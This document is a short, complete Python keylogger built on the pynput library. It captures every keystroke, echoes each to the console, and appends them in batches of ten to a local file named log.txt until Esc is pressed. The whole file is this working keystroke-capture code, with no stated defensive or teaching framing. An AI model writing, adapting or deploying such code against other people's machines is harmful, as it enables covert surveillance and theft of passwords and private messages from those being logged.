import pynput

from pynput.keyboard import Key,Listener
import os

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(f'{key} pressed')

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []
        print('updated')




def write_file(keys):
    filename = './log.txt'
    with open(filename,'a') as file:
        for key in keys:
            s = str(key).replace("'","")
            if s.find("space") > 0:
                file.write("\n")
            if s.find("Key") == -1:
                file.write(s)



def on_release(key):
    if key == Key.esc:
        return False



with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()